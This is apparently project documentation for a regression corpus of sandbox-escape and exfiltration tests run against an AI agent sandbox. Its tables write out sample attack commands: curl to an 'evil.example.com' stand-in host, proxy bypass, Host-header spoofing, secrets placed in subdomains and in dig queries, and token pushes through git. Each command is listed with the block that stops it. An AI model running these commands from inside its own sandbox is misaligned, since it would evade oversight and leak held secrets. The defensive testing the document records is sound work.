# Sandbox escape regression corpus

These are the escape and exfiltration techniques the project's own end-to-end
suite tries against a real bottle. The project wrote this corpus. It is not
the result of outside red-teaming.

Every test is in `tests/integration/test_sandbox_escape.py`, class
`TestSandboxEscape`. "Since" is when the attack first went into the suite,
from git history. New techniques go at the bottom of their table.

## The test bottle

The suite brings up one bottle with:

- one allowlisted host: the Claude provider's `api.anthropic.com` route
- planted fake secrets
- a git-gate repo whose upstream is unreachable

## Where it runs

On every change, the corpus proves the Docker backend only. Firecracker and
Apple container isolation is exercised before releases, not per change.

| Backend | When | No-skip gate |
|---|---|---|
| Docker | every pull request and push to `main`, on Gitea and on GitHub's hosted runners | Yes. The job must run all integration tests with none skipped ([ci.md](../reference/ci.md)). |
| Firecracker | only in the manually dispatched pre-release matrix, on a self-hosted runner | No. A skipped test doesn't fail the job. |
| macos-container | only in the manually dispatched pre-release matrix, on a self-hosted runner. Advisory. | No. A skipped test doesn't fail the job. |

---

## Network

| Attack | Technique | Outcome | Test | Since |
|---|---|---|---|---|
| **Non-allowlisted hostname** | `curl https://evil.example.com/` from inside the agent. | Refused. The test checks only that curl (`--fail`) exits non-zero. | `test_1_hostname_not_in_allowlist` | 2026-05-26 |
| **Direct IP literal** | `curl https://198.51.100.1/`, an RFC 5737 documentation address. | Refused. The test checks only that curl exits non-zero. | `test_2_ip_not_in_allowlist`, subTest `attack="direct IP"` | 2026-05-26 |
| **Proxy bypass** | `curl --noproxy '*' http://1.1.1.1/`, to dial a public address without the egress proxy. | No connection. The agent's network has no route off the host except through the gateway. Any HTTP status at all would count as a leak. | `test_2_ip_not_in_allowlist`, subTest `attack="proxy bypass"` | 2026-10-22 |
| **Allowed hostname resolved to another IP** (`--resolve`) | `curl --resolve api.anthropic.com:443:198.51.100.1 https://api.anthropic.com/`, to send an allowed name to an unrelated address. | The address is never used. Through a proxy, curl's `--resolve` doesn't apply to the target, and the gateway resolves the name itself. The test checks only that curl (`--fail`) exits non-zero, so an error status from the real host would also pass it. | `test_2_ip_not_in_allowlist`, subTest `attack="host-header spoof"` | 2026-05-26 |
| **CONNECT to an unlisted host with a listed `Host`** | HTTPS to `example.com` with `Host: api.anthropic.com`. The request inside the tunnel would be policed, and given credentials, as the allowed host. | The `CONNECT` itself gets a 403. No tunnel is opened. | `test_2_ip_not_in_allowlist`, subTest `attack="CONNECT to unlisted host, Host names a listed one"` | 2026-10-26 |
| **Plain HTTP to an unlisted host with a listed `Host`** | `http://example.com/` with `Host: api.anthropic.com`. | 403 from the gateway with an egress marker. | `test_2_ip_not_in_allowlist`, subTest `attack="plain HTTP to unlisted host, Host names a listed one"` | 2026-10-26 |
| **CONNECT to another port** | `https://example.com:22/`, a tunnel that could carry raw TCP. | The `CONNECT` gets a 403. | `test_2_ip_not_in_allowlist`, subTest `attack="CONNECT to an unlisted host's other port"` | 2026-10-26 |
| **Secret in path, query, body or header** | A planted secret in the URL path, the query string, a JSON POST body, and an `X-Custom` header, each to `raw.githubusercontent.com`. | 403 with an egress marker, or a refusal at `CONNECT`. See [the note below](#path-query-body-and-header-test-the-allowlist-not-dlp). | `test_3_http_exfil_blocked`, subTests `shape="path"`, `"query"`, `"body"`, `"header"` | 2026-05-26 |

### Path, query, body and header test the allowlist, not DLP

The destination of `test_3_http_exfil_blocked` is not on the allowlist. It
exercises the allowlist, not DLP on an allowed host.

Outbound DLP on allowed hosts is covered by unit tests, not by this suite:
`tests/unit/test_dlp_detectors.py` and
`tests/unit/test_egress_addon_request_flow.py`.

---

## DNS

| Attack | Technique | Outcome | Test | Since |
|---|---|---|---|---|
| **Secret in a subdomain of an allowed host** | `https://$SECRET.api.anthropic.com/`, which looks like it's under the allowed name. | Refused. The allowlist matches the exact host. The test checks only that curl exits non-zero. | `test_4_dns_exfil_blocked`, subTest `attack="crafted subdomain"` | 2026-05-26 |
| **Direct DNS query to a public resolver** | `dig @8.8.8.8 "$SECRET.example.com"`. | No reply. Any reply, even NXDOMAIN, would mean the query left the host. | `test_4_dns_exfil_blocked`, subTest `attack="direct dig"` | 2026-05-26 |
| **The runtime's own resolver** | `dig example.com` against the resolver the container or VM is given. | The name doesn't resolve, so that resolver isn't a channel off the host. | `test_4_dns_exfil_blocked`, subTest `attack="runtime resolver"` | 2026-10-22 |

---

## Git push

| Attack | Technique | Outcome | Test | Since |
|---|---|---|---|---|
| **Token-shaped secret pushed through git-gate** | Commit a README linking to an attacker URL with a `ghp_…`, `xoxb-…` or `glpat-…` token in it, and push through git-gate. | Refused by gitleaks in pre-receive, before git-gate tries the upstream. The output must name gitleaks and carry no upstream network error. | `test_5_readme_push_blocked`, subTests `secret="github"`, `"slack"`, `"gitlab"` | 2026-05-26. The current GitHub, Slack and GitLab shapes since 2026-07-11. |
| **The bottle's own shapeless secret pushed** | Commit a bottle env secret, a `?` value, that has no token shape gitleaks knows, and push. | Refused by git-gate's held-secret scan (`gateway/git_gate/held_secret_scan.py`). It matches the bottle's registered secret values. | `test_6_held_secrets_never_leave`, subTest `attack="push secret env value"` | 2026-10-23 |
| **The canary pushed** | Commit the bottle's per-session canary value and push. | Refused by the held-secret scan. | `test_6_held_secrets_never_leave`, subTest `attack="push canary"` | 2026-10-23 |

---

## Outbound DLP

| Attack | Technique | Outcome | Test | Since |
|---|---|---|---|---|
| **The canary sent to an allowlisted host** | POST the canary in a JSON body to `api.anthropic.com`, which is allowed. | 403 from egress DLP naming `HELD_CANARY`. The canary check runs on every inspected route, whatever the route's DLP settings. On an `inspect: false` route it isn't seen ([gateway.md](../reference/gateway.md#outbound-dlp)). | `test_6_held_secrets_never_leave`, subTest `attack="canary to an allowlisted host"` | 2026-10-23 |

---

## Not covered yet

The suite doesn't attempt these.

| Not attempted | What's missing |
|---|---|
| **Escaping the VM or container** | Kernel or hypervisor exploits, container runtime escapes, or a root-capable agent removing its in-guest firewall on macos-container ([backends.md](../reference/backends.md#agents-cant-reach-each-other)). |
| **The control plane from inside a bottle** | Reaching or abusing the orchestrator or the host controller. Control-plane authentication and per-bottle token and allowlist isolation have their own Docker integration tests, `test_orchestrator_docker_auth.py` and `test_multitenant_isolation.py`. They don't attack from inside an agent. |
| **Getting past the trust prompt** | A repository's bottle or agent gaining grants without this host trusting it. |
| **`inspect: false` routes** | The suite's bottle has none, so nothing tests what an unscanned tunnel can carry. |
| **Outbound DLP on an allowed host** | For planted secrets, beyond the canary. See [the path, query, body and header note](#path-query-body-and-header-test-the-allowlist-not-dlp). |
| **The console link** | What a paired console can do to the host ([host-controller.md](../reference/host-controller.md#what-pairing-lets-the-console-do)). |
